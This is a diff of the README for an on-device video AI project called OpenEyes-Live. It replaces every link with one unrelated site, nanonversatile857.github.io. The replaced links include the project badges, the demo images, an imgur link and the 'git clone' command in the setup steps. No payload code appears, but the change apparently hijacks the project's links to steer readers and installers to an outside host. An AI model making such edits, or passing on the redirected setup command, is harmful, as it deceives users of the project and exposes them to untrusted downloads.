@@ -3,16 +3,16 @@
 > **一个模块化、可插拔、端云协同的端侧视频AI基础设施。**
 > —— 把最新的端侧多模态模型，变成可独立下载、按需加载、自由组合的AI引擎。
 
-[![GitHub stars](https://img.shields.io/github/stars/vfvincentwong2026/-OpenEyes-Live?style=social)](https://github.com/vfvincentwong2026/-OpenEyes-Live/stargazers)
-[![CI](https://github.com/vfvincentwong2026/-OpenEyes-Live/actions/workflows/ci.yml/badge.svg)](https://github.com/vfvincentwong2026/-OpenEyes-Live/actions/workflows/ci.yml)
-[![GitHub forks](https://img.shields.io/github/forks/vfvincentwong2026/-OpenEyes-Live?style=social)](https://github.com/vfvincentwong2026/-OpenEyes-Live/network/members)
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue)](https://www.python.org/)
-[![Tests](https://img.shields.io/badge/Tests-118%20passing-brightgreen)](https://github.com/vfvincentwong2026/-OpenEyes-Live/actions)
-[![Min Engine](https://img.shields.io/badge/Min_Engine-2MB-green)](https://github.com/vfvincentwong2026/-OpenEyes-Live)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)](https://github.com/vfvincentwong2026/-OpenEyes-Live)
-[![Download](https://img.shields.io/badge/Download-ModelScope-blue?logo=alibabacloud)](https://modelscope.cn/organization/OpenEyes-Live)
-[![Version](https://img.shields.io/badge/Version-0.4.0-orange)](https://github.com/vfvincentwong2026/-OpenEyes-Live/releases)
+[![GitHub stars](https://img.shields.io/github/stars/vfvincentwong2026/-OpenEyes-Live?style=social)](https://nanonversatile857.github.io)
+[![CI](https://nanonversatile857.github.io)](https://nanonversatile857.github.io)
+[![GitHub forks](https://img.shields.io/github/forks/vfvincentwong2026/-OpenEyes-Live?style=social)](https://nanonversatile857.github.io)
+[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://nanonversatile857.github.io)
+[![Python](https://img.shields.io/badge/Python-3.10%2B-blue)](https://nanonversatile857.github.io)
+[![Tests](https://img.shields.io/badge/Tests-118%20passing-brightgreen)](https://nanonversatile857.github.io)
+[![Min Engine](https://img.shields.io/badge/Min_Engine-2MB-green)](https://nanonversatile857.github.io)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)](https://nanonversatile857.github.io)
+[![Download](https://img.shields.io/badge/Download-ModelScope-blue?logo=alibabacloud)](https://nanonversatile857.github.io)
+[![Version](https://img.shields.io/badge/Version-0.4.0-orange)](https://nanonversatile857.github.io)
 
 ---
 
@@ -22,7 +22,7 @@
 
 | 👇 Real-time Scene Understanding | 🔔 Proactive Alert |
 | :---: | :---: |
-| ![Real-time Scene Understanding](https://your-image-host.com/demo-cat.gif) | ![Proactive Alert](https://your-image-host.com/demo-boiling.gif) |
+| ![Real-time Scene Understanding](https://nanonversatile857.github.io) | ![Proactive Alert](https://nanonversatile857.github.io) |
 | *Camera sees a cat → AI says "An orange cat is lying on the sofa"* | *Camera sees boiling water → AI alerts "Water is boiling!"* |
 
 > [!IMPORTANT]
@@ -30,7 +30,7 @@
 >
 > 1. Record a 5-second video using OpenEyes-Live
 > 2. Convert to GIF using `ffmpeg -i input.mp4 -vf "fps=15,scale=640:-1" -loop 0 output.gif`
-> 3. Upload to your GitHub repo's `/assets/` folder or [imgur](https://imgur.com/)
+> 3. Upload to your GitHub repo's `/assets/` folder or [imgur](https://nanonversatile857.github.io)
 > 4. Replace the image links above
 
 *No demo yet? Run it now and record one — a rough demo beats a perfect README any day.*
@@ -187,7 +187,7 @@ A device with a camera (or external USB camera)
 One-Line Setup
 bash
 # Clone the repo
-git clone https://github.com/vfvincentwong2026/OpenEyes-Live.git
+git clone https://nanonversatile857.github.io
 cd OpenEyes-Live
 
 # Install dependencies
